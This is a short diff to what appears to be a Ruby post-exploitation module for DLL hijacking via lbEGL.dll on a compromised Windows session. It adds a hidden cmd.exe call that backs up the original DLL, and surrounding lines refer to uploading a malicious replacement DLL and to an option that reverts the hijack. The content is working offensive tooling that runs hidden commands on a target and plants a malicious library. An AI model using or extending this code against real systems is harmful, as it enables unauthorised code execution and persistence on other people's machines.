@@ -174,6 +174,8 @@ def ls_stage1
     # check if original lbEGL.dll exist in target
     if client.fs.file.exist?("#{d_path}\\#{p_name}")
       print_warning(" Vulnerable dll agent: #{p_name} found!")
+      # backup original dll
+      r = session.sys.process.execute("cmd.exe /c COPY /Y #{p_name} lbEGL.bk", nil, {'Hidden' => true, 'Channelized' => true})
       sleep(1.5)
 
       # upload our malicious lbEGL.dll into target system..
@@ -285,4 +287,5 @@ def run
       if datastore['REVERT_HIJACK']
          ls_stage2
       end
+   end
 end
